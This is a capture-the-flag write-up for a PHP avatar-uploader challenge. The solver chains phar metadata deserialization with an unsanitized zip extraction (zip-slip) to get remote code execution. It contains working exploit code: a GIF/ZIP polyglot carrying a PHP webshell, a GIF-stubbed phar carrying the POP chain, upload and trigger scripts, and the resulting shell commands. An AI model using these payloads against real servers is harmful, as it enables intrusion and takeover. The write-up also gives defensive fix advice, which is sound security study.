@@ -1,0 +1,204 @@
+---
+title: "Reto15_Ghost"
+description: "An avatar uploader written in PHP. The only download was a single file, src/classes.php."
+date: 2026-08-04T12:14:00.000Z
+tags: ["ctf", "pentesting-web", "ecsc26"]
+ctf: "ECSC 2026 Spanish Qualifier (INCIBE)"
+category: "Pentesting Web"
+---
+
+**CTF:** ECSC 2026 Spanish Qualifier (INCIBE)  
+**Category:** Pentesting Web  
+**Difficulty:** 1600  
+
+## Challenge
+
+An avatar uploader written in PHP. The only download was a single file, `src/classes.php`. The live site had the upload form, a second field (`check_path`) to "verify media asset" that takes an arbitrary path, and a footer that reads "Phar Media Stream Integrity Engine".
+
+## Solution
+
+### The gadget chain was handed to us
+
+`classes.php` is 43 lines and it is the whole challenge. Everything below the opening `<?php` tag:
+
+```php
+class ZipExtractor {
+    public $zipFile;
+    public $targetDir;
+
+    public function __construct($zipFile = null, $targetDir = null) {
+        $this->zipFile = $zipFile;
+        $this->targetDir = $targetDir;
+    }
+
+    public function run() {
+        if ($this->zipFile && file_exists($this->zipFile)) {
+            $zip = new ZipArchive();
+            if ($zip->open($this->zipFile) === TRUE) {
+                for ($i = 0; $i < $zip->numFiles; $i++) {
+                    $filename = $zip->getNameIndex($i);
+                    $targetPath = $this->targetDir . '/' . $filename;
+                    $dir = dirname($targetPath);
+                    if (!is_dir($dir)) {
+                        mkdir($dir, 0777, true);
+                    }
+                    file_put_contents($targetPath, $zip->getFromIndex($i));
+                }
+                $zip->close();
+            }
+        }
+    }
+}
+
+class FileManager {
+    public $cleanup;
+
+    public function __construct($cleanup = null) {
+        $this->cleanup = $cleanup;
+    }
+
+    public function __destruct() {
+        if ($this->cleanup) {
+            $this->cleanup->run();
+        }
+    }
+}
+```
+
+That is a POP chain with no assembly required. `FileManager::__destruct()` calls `run()` on whatever object I put in `$cleanup`, and `ZipExtractor::run()` builds its destination as `$targetDir . '/' . $filename` with zero sanitization. Both halves of that join are mine: `targetDir` is a property I set on the object, and `$filename` is an archive entry name. Either half alone is already a free file write, and the entry name gives traversal on top, so `../gh0st.php` in a zip lands one directory above the extraction root. That is zip-slip, and it has been the same bug since the Zip Slip disclosures in 2018.
+
+So the shape of the attack was clear from minute one: get a serialized `FileManager` into an `unserialize()` somewhere, and have an archive sitting on disk for it to point at. The interesting part was the "somewhere".
+
+### The textbook phar trigger is dead on PHP 8
+
+The classic move here is a phar. Any stream function given a `phar://` URL parses the archive, and the archive's metadata gets unserialized, so `file_exists("phar://evil.gif/x")` alone pops the chain. That is the trick every writeup teaches.
+
+It does not work on PHP 8. Metadata unserialization became lazy in 8.0. I checked this locally on 8.3.6 with a harness that takes one function name on `argv` and runs exactly that one call, in a fresh process, against a phar built by a different process:
+
+```php
+// php trigger_test.php <fn> <pharUrl> <archiveUrl>
+$fn = $argv[1]; $u = $argv[2]; $a = $argv[3];
+switch ($fn) {
+    case 'file_exists':       @file_exists($u); break;
+    case 'file_get_contents': @file_get_contents($u); break;
+    case 'getimagesize':      @getimagesize($u); break;
+    // ... 22 file and stream functions in all ...
+    case 'new_Phar':    try { $p = new Phar(str_replace('phar://', '', $a)); } catch (Throwable $e) {} break;
+    case 'getMetadata': try { $p = new Phar(str_replace('phar://', '', $a)); $p->getMetadata(); } catch (Throwable $e) {} break;
+    case 'PharData':    try { $p = new PharData(str_replace('phar://', '', $a)); } catch (Throwable $e) {} break;
+}
+```
+
+Across all 25 cases exactly one fired the destructor, and it was `getMetadata()`. **None** of the 22 file and stream functions did anything at all: `file_exists`, `is_file`, `is_dir`, `filesize`, `file_get_contents`, `file`, `readfile`, `fopen`, `stat`, `filemtime`, `is_readable`, `realpath`, `md5_file`, `hash_file`, `getimagesize`, `mime_content_type`, `exif_imagetype`, `copy`, `opendir`, `scandir`, `unlink`, `include`. Constructing the object was not enough either: `new Phar(...)` and `new PharData(...)` both stayed silent, which is precisely what "lazy" means. The metadata is only unserialized when something actually asks for it, and the only route to that is a `Phar` you can construct in the first place, which demands a recognized extension. `new Phar('evil.gif')` throws `UnexpectedValueException: Cannot create phar '/path/evil.gif', file extension (or combination) not recognised or the directory does not exist`.
+
+One methodological point worth recording, because it is the kind of thing that quietly poisons a whole session. My first harness, `test_local.php`, built the phar and probed it in the same process, and a harness shaped like that cannot answer the question at all: the `FileManager` object is still sitting in memory, so its destructor runs at script end regardless of what any test did. Running it on 8.3.6 shows exactly that, nothing printed under any of its eleven tests and a single firing after the closing "done" line, attributable to nothing. Splitting the build and the probe into two processes, `diag.php` and `trigger_test.php`, is what made the result mean anything.
+
+### The uploader told me which extension it wanted
+
+If the trigger needs a recognized extension, the question becomes whether the uploader lets me keep one. So I threw a list of extensions at it:
+
+```python
+for name in ["a.phar", "a.zip", "a.tar", "a.png", "a.gif", "a.phar.gif", "a.gif.phar",
+             "a.PHAR", "a.jpeg", "a"]:
+    r = S.post(BASE + "/index.php", files={"avatar": (name, data, "image/gif")}, timeout=25)
+```
+
+`.zip` and `.tar` came back rewritten to `.png`. `.phar` came back as `.phar`. That is not an oversight, that is the author leaving the door open. When an uploader's extension policy has a conspicuous exception, the exception **is** the hint. Combined with the "Phar Media Stream Integrity Engine" line in the footer, the intended path was now unambiguous: upload the archive as a `.phar` and hand that stored path to the verify field, which constructs a `Phar` on it and reads its metadata.
+
+The upload itself is magic-header checked, so whatever I send has to start like a real image. Stored names are hashed, which is why this needs two files rather than one: a phar whose metadata points at itself would need to know its own stored name before it was uploaded.
+
+### Building the two polyglots
+
+File one, `payload.gif`, is a real GIF followed by a ZIP holding the webshell. The detail that matters is writing both through a **single** handle, so the offsets Python records in the central directory are absolute from byte 0 and libzip can still parse the archive despite the prefix:
+
+```python
+GIF = bytes.fromhex(
+    "474946383961010001008000000000ffffff21f90401000000002c00000000010001000002024401003b")
+SHELL = b"<?php echo '<pre>'; system($_REQUEST['c'] ?? 'id'); echo '</pre>'; ?>\n"
+
+buf = io.BytesIO()
+buf.write(GIF)
+with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
+    z.writestr("gh0st.php", SHELL)        # -> <targetDir>/gh0st.php
+    z.writestr("../gh0st.php", SHELL)     # -> zip-slip one level up
+```
+
+380 bytes, and both halves are valid:
+
+```text
+00000000: 4749 4638 3961 0100 0100 8000 0000 00ff  GIF89a..........
+00000010: ffff 21f9 0401 0000 0000 2c00 0000 0001  ..!.......,.....
+00000020: 0001 0000 0202 4401 003b 504b 0304 1400  ......D..;PK....
+00000030: 0000 0800 aa51 045d 712b 55ec 3d00 0000  .....Q.]q+U.=...
+00000040: 4600 0000 0900 0000 6768 3073 742e 7068  F.......gh0st.ph
+```
+
+File two, `evil.phar`, is a GIF-stubbed PHAR whose metadata is the POP chain, pointed at wherever file one landed:
+
+```php
+$GIF = base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==');
+
+$p = new Phar('evil.phar');
+$p->startBuffering();
+$p->setStub($GIF . "<?php __HALT_COMPILER(); ?>");
+$p->addFromString('a.txt', 'x');
+$p->setMetadata(new FileManager(new ZipExtractor($zipRemote, $targetDir)));
+$p->stopBuffering();
+```
+
+The stub is what makes it pass the image check while remaining a legal phar, since PHP only requires the stub to end in `__HALT_COMPILER();`:
+
+```text
+00000000: 4749 4638 3961 0100 0100 8000 0000 0000  GIF89a..........
+00000010: ffff ff21 f904 0100 0000 002c 0000 0000  ...!.......,....
+00000020: 0100 0100 0002 0244 0100 3b3c 3f70 6870  .......D..;<?php
+00000030: 205f 5f48 414c 545f 434f 4d50 494c 4552   __HALT_COMPILER
+00000040: 2829 3b20 3f3e 0d0a d000 0000 0100 0000  (); ?>..........
+00000050: 1100 0000 0100 0000 0000 9d00 0000 4f3a  ..............O:
+```
+
+That trailing `4f3a` is `O:`, the start of the serialized `FileManager`.
+
+### Firing it
+
+Upload the archive, note its stored path, rebuild the phar with `zipFile` set to that path, upload the phar, then POST the stored `.phar` path to the verify field. The request ends, the destructor runs, `ZipExtractor::run()` opens my GIF as a zip and writes both entries out.
+
+The one thing I could not read off the source was the docroot, so `targetDir` was a guess. I swept it rather than reasoning about it, trying each `zipFile`/`targetDir` pairing with both the bare stored path and a `phar://<path>/a.txt` form as the trigger:
+
+```python
+for zfile, tdir in [(zp, "uploads"), (zp, "."), (f"/var/www/html/{zp}", "/var/www/html/uploads"),
+                    (zp, ".."), (f"./{zp}", "uploads")]:
+    subprocess.run(["php", "-d", "phar.readonly=0", "build_phar.php", zfile, tdir], ...)
+    pp = upload("evil.phar", (HERE / "evil.gif").read_bytes())
+    for trig in [pp, f"phar://{pp}/a.txt"]:
+        S.post(BASE + "/index.php", data={"check_path": trig}, timeout=30)
+```
+
+The first pairing was the one that landed: the stored archive path as `zipFile`, `uploads` as `targetDir`. That drops the archive's plain `gh0st.php` entry straight into the directory the site already serves uploads from, so the sweep never got past its first iteration and the phar I was left holding still carries `s:9:"targetDir";s:7:"uploads";`.
+
+Then just poll for the shell:
+
+```text
+GET /uploads/gh0st.php?c=id  ->  uid=33(www-data) gid=33(www-data)
+```
+
+From there it was one command:
+
+```text
+$ cat /flag.txt
+flag{ECSC2026_polyglot_phar_deserialization_zip_slip_rce}
+```
+
+Flag: `flag{ECSC2026_polyglot_phar_deserialization_zip_slip_rce}`
+
+## Takeaway
+
+Two separate bugs had to be chained, and each one is independently fatal.
+
+The first is PHP object injection through phar metadata. The lesson people take from this bug is usually "don't let user input reach `file_exists`", and on PHP 8 that specific advice is now stale in an actively misleading way: the stream-wrapper trigger is gone, so a quick test with `file_exists` shows nothing and the target looks safe. What survives is a `Phar` built from a user-supplied path whose metadata something then reads, `new Phar($userPath)` followed by `getMetadata()`, which is exactly what a "media integrity" feature ends up doing. The correct fix is not to filter `phar://` out of the input, it is to never construct a `Phar` from a user-supplied path at all, and to keep uploaded files off any filesystem PHP will execute or parse. If a phar really must be opened, `Phar::setMetadata` payloads are neutralized by never calling `getMetadata()` and by treating archive metadata as untrusted serialized data, which it is.
+
+The second is the unsanitized extraction, and it is worth being precise about which half of it actually did the work. `$targetDir . '/' . $filename` is the entire vulnerability, and once the payload object is deserialized both operands belong to me. That means I never needed the traversal at all. The pairing that landed set `targetDir` to `uploads`, and the entry that gave me the shell was the plain `gh0st.php`, written to `uploads/gh0st.php`. The `../gh0st.php` entry was written too, one level up into the docroot, but nothing I did afterward used it. The traversal was insurance against a `targetDir` I could not aim at a served directory, and here I could aim it wherever I liked. The bug that was genuinely required in this chain is the arbitrary file write into a web-served directory; zip-slip came along for free.
+
+It is still a real zip-slip, and that half is the one with the tidy fix, because the platform already gets it right when you let it: extracting my own `payload.gif` with `ZipArchive::extractTo('out')` on 8.3.6 produced a single file, `out/gh0st.php`, because php_zip normalizes every entry against the destination, and Python's `zipfile` behaves the same way, with `extract('../gh0st.php', 'pyout')` returning `pyout/gh0st.php` on 3.12.3. The challenge is exploitable precisely because it never calls `extractTo` and joins the path by hand instead. If the join has to be hand-rolled, create the extraction directory first, resolve the joined path with `realpath()`, refuse anything that does not still begin with that canonical directory, and reject entries containing `..` or an absolute prefix outright. None of which saves you here, because the extraction root was attacker-controlled as well, and that is the deeper lesson: the destination directory has to be a constant the code owns, never a property read back off a deserialized object.
+
+And the smaller operational lesson: the uploader rewrote `.zip` and `.tar` to `.png` but left `.phar` alone. An allowlist with one odd exception is a bigger tell than no allowlist at all. Normalize every upload to a server-chosen name and extension, with no exceptions, because the exception is the first thing an attacker will find.
